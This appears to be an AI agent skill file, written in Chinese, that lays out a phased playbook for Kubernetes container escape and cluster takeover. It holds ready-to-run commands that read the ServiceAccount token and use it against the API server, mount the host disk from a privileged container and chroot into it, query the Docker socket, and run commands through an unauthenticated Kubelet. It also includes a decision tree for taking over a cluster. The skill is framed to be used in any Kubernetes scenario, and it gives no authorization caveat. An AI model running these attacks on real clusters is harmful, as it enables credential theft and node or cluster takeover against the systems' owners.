---
name: k8s-container-escape
description: "Kubernetes 容器逃逸与集群攻击。当目标运行在 K8s 环境中、发现 6443/10250/2379 端口、获取到 ServiceAccount Token、或已在容器内时使用。覆盖容器逃逸、Pod 提权、API Server 未授权、etcd 泄露、RBAC 滥用、节点接管。任何涉及 Kubernetes、容器编排、云原生安全的场景都应使用此技能"
metadata:
  tags: "k8s,kubernetes,container,escape,pod,rbac,etcd,apiserver,serviceaccount,容器逃逸,云原生,集群攻击"
  category: "cloud"
---

# Kubernetes 容器逃逸与集群攻击

K8s 集群一旦被突破，攻击面极大——从单个 Pod 可以横向扩展到整个集群的所有节点和服务。

## ⛔ 深入参考（必读）

- 容器逃逸详细手法（挂载逃逸/内核漏洞/特权容器/cgroup）→ 读 [references/escape-techniques.md](references/escape-techniques.md)
- 集群层面攻击（API Server/etcd/RBAC/横向移动）→ 读 [references/cluster-attacks.md](references/cluster-attacks.md)
- RBAC 权限自检、Pod 内 API 请求、badPods/KubeHound/gitRepo volume → 读 [references/rbac-and-api-abuse.md](references/rbac-and-api-abuse.md)

---

## Phase 1: 环境识别

### 1.1 确认在容器内
```bash
cat /proc/1/cgroup 2>/dev/null | grep -qi 'docker\|kubepods\|containerd'
ls /.dockerenv 2>/dev/null || ls /run/secrets/kubernetes.io 2>/dev/null
hostname    # K8s Pod 名通常含 deployment 名
env | grep -i kube
```

### 1.2 K8s 环境信息收集
```bash
# ServiceAccount Token（几乎每个 Pod 都有）
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)

# API Server 地址
echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# 测试 API 权限
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$NAMESPACE/pods
```

### 1.3 外部端口探测
| 端口 | 服务 | 攻击面 |
|------|------|--------|
| 6443 | API Server | 未授权/Token 利用 |
| 10250 | Kubelet | 命令执行 |
| 10255 | Kubelet (只读) | 信息泄露 |
| 2379 | etcd | 全量数据（含 Secrets） |
| 8080 | API Server (不安全) | 完全控制 |

## Phase 2: 攻击决策树

```
当前位置？
├─ 容器内部
│   ├─ 特权容器（privileged=true）→ 挂载宿主机 → 逃逸
│   ├─ 挂载了 hostPath/docker.sock → 逃逸
│   ├─ 有 SA Token → SelfSubjectRulesReview / can-i → RBAC 权限驱动攻击
│   ├─ 能 create pods / pods/exec / impersonate → Pod 创建、进入高权限 Pod 或模拟高权限账户
│   └─ 普通容器 → 内核漏洞/cgroup 逃逸
├─ 可访问 Kubelet (10250)
│   └─ 未授权 → 任意 Pod 命令执行
├─ 可访问 API Server (6443/8080)
│   ├─ 匿名访问 → 创建特权 Pod
│   └─ Token → RBAC 权限枚举
└─ 可访问 etcd (2379)
    └─ 提取所有 Secrets
详细命令 → 参考 references
```

## Phase 3: 容器逃逸速查

### 特权容器逃逸（最常见）
```bash
# 检查是否特权容器
cat /proc/1/status | grep -i cap
# CapEff: 0000003fffffffff 表示全能力 = 特权容器

# 方法 1: 挂载宿主机文件系统
mkdir -p /tmp/hostroot
mount /dev/sda1 /tmp/hostroot
chroot /tmp/hostroot bash
```

### Docker Socket 逃逸
```bash
ls -la /var/run/docker.sock
# 存在则可创建特权容器挂载宿主机
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

→ 完整逃逸手法 → [references/escape-techniques.md](references/escape-techniques.md)

## Phase 4: Kubelet 未授权

```bash
# 列出所有 Pod
curl -sk https://NODE_IP:10250/pods

# 在任意 Pod 中执行命令
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER \
  -d "cmd=id"
```

## Phase 5: 集群接管

```bash
# 用 SA Token 检查权限
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  https://API_SERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# 能创建 Pod → 创建特权 Pod 挂载节点
```

→ 详细集群攻击 → [references/cluster-attacks.md](references/cluster-attacks.md)

## 工具速查
| 工具 | 用途 |
|------|------|
| kubectl | K8s 集群管理 |
| kubeletctl | Kubelet 利用 |
| CDK | 容器逃逸自动化 |
| PEIRATES | K8s 渗透框架 |
| etcdctl | etcd 数据提取 |
